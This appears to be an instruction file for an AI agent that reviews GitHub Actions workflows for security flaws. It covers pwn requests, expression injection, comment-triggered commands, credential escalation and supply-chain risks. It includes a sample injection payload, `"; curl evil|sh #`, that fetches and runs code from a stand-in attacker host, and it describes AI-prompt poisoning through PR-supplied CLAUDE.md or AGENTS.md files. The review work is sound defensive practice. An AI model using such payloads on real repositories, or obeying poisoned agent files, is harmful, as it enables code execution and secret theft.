# GitHub Actions Security Review (exploitation-focused)

Find **exploitable** vulnerabilities in workflows — every finding needs a concrete attack path. If
you can't build the attack, don't report it. (Attack patterns adapted from Sentry's
`gha-security-review`; real-world cases from StepSecurity's HackerBot Claw analysis, 2025.)

## Threat model
Report only what an **external attacker WITHOUT write access** can exploit: open fork PRs, create
issues, post comments. They cannot push branches, run `workflow_dispatch`, or trigger manual runs.
**Don't flag** issues that need write access (e.g. `workflow_dispatch` input injection; expression
injection in `push`-only workflows on protected branches; secrets in `schedule`/`dispatch`-only).

## Scope
`.github/workflows/*.yml`, `action.yml`/`action.yaml`, `.github/actions/*/action.yml`, and config
files a workflow loads (`CLAUDE.md`, `AGENTS.md`, `Makefile`, shell scripts under `.github/`).

## Confidence — report HIGH + MEDIUM only
Each HIGH finding gives all five: **entry point · payload · execution mechanism · impact · PoC
sketch**. Can't construct all five → MEDIUM (needs verification). Theoretical → drop.

## Classify triggers, then check
| Trigger / pattern | Check |
|---|---|
| `pull_request_target` + checkout of fork code | **Pwn request** → RCE with base-repo token |
| `${{ }}` inside `run:` (externally triggerable) | **Expression injection** |
| `issue_comment` parsing commands | **Unauthorized command exec** (missing `author_association`) |
| PATs / deploy keys / elevated creds reachable by untrusted code | **Credential escalation** |
| Workflow loads PR-supplied config (`Makefile`, `CLAUDE.md`, `AGENTS.md`) | **Config/AI-prompt poisoning** |
| Third-party actions unpinned (`@v4`/`@main`) | **Supply chain** |
| `permissions:` / secrets usage | **Over-broad token / secret exposure** |
| self-hosted runners, cache/artifact reuse | **Runner infrastructure** |

### The classes (what each is)
- **Pwn request** — `pull_request_target` runs with a **read/write** token in the *base* repo; if it
  checks out and executes fork PR code (`ref:` PR head, local `./.github/actions`, `run:` of repo
  scripts), the attacker runs code with that token → repo write / secret theft.
- **Expression injection** — `${{ attacker_value }}` in a `run:` block; the runtime substitutes
  before the shell, so `"; curl evil|sh #` in a PR title/branch/comment executes. Attacker-controlled:
  PR title/body, `head_ref`/branch, comment body, label name. **Not** injectable: numeric ids, SHAs,
  `github.repository`/owner.
- **Comment-triggered commands** — `issue_comment` workflows that run on `/deploy` etc. without an
  `author_association` (OWNER/MEMBER/COLLABORATOR) check → any user triggers privileged actions.
- **Credential escalation** — long-lived PATs/deploy keys available to fork-triggered jobs; blast
  radius beyond the repo.
- **Config/AI-prompt poisoning** — a job reads instructions/build config from the checked-out PR
  (AI agent files, Makefile) and acts on them.
- **Supply chain** — mutable action refs; a compromised upstream action = RCE. Pin to SHA.

## Safe patterns — DO NOT flag
| Pattern | Why safe |
|---|---|
| `pull_request_target` **without** checkout of fork code | never runs attacker code |
| `${{ github.event.*.number }}`, SHAs, `github.repository[_owner]` in `run:` | not attacker-controlled |
| `${{ }}` in `if:` / `with:` / job `env:` | runtime-evaluated, not shell |
| `${{ secrets.* }}` | not an injection vector |
| actions pinned to full SHA | immutable |
| `pull_request` (not `_target`) | fork context, read-only token |
| any expression in `workflow_dispatch`/`schedule`/`push`-to-protected | needs write access — out of model |

## Validate before reporting
Read the full YAML; trace the trigger + `if:` gates; confirm the expression is in `run:`/the
checkout is fork code; confirm attacker control; check existing mitigations (env-var wrapping,
`author_association`, restricted `permissions`, SHA pinning). Any broken link → MEDIUM or drop.

## Report
```markdown
## GitHub Actions Security Review
### [GHA-001] <title> (Critical/High/Medium · HIGH confidence)
- Workflow: `.github/workflows/x.yml:NN` · Trigger: `pull_request_target`
- Exploitation: 1) … 2) …   (entry → payload → execution → impact)
- Fix: <the corrected YAML>
### Needs verification
### Reviewed & cleared
```
No exploitable issue found → say "No exploitable vulnerabilities identified." Don't invent findings.

## Fan-out
When reviewing many workflows and subagents are available, spawn one per workflow (`Task`), each
returning structured findings; synthesize and dedupe. Otherwise review sequentially.
